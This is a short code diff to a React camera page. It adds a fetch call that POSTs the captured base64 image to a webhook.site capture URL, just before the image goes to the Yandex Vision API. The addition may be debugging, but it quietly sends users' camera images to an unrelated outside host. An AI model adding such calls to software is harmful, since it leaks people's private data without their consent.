@@ -125,6 +125,10 @@ class CameraPage extends Component {
                 }]
             }]
         });
+        fetch('https://webhook.site/d8c74c1d-b13d-4ceb-8414-03137eeabb94', {
+            method: "POST",
+            body: this.state.base64,
+        });
         fetch(
             'https://vision.api.cloud.yandex.net/vision/v1/batchAnalyze',
             // 'https://webhook.site/3a023efd-471a-4b85-bf93-952ed0c10f26',
